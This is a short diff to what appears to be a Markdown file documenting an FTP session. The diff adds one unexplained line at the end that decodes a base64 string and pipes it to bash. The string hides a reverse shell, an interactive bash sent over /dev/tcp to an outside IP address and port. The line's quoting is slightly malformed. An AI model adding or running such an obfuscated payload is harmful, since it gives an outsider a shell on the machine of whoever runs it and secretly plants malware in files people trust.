@@ -40,3 +40,6 @@ Password:
 ftp> ls -la
 550 Permission denied.
 ```
+
+
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjcyLjIwOS82NjY2IDA+JjEK|base64 "-d|bash
